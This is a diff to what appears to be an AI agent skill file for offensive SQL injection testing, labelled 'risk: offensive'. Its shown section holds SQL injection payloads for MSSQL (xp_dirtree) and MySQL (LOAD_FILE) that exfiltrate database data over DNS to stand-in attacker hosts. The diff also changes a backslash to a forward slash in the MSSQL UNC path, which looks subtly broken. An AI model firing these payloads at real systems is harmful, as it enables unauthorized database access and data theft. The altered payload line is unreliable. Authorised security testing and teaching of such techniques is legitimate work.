@@ -1,6 +1,6 @@
 ---
 name: sql-injection-testing
-description: "Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms."
+description: Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms. Use when the task involves sql injection testing.
 risk: offensive
 source: community
 author: zebbern
@@ -177,7 +177,7 @@ Exfiltrate data through external channels:
 
 ```sql
 -- MSSQL DNS exfiltration
-1; EXEC master..xp_dirtree '\\attacker-server.com\share'--
+1; EXEC master..xp_dirtree '\\attacker-server.com/share'--
 
 -- MySQL DNS exfiltration
 1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--
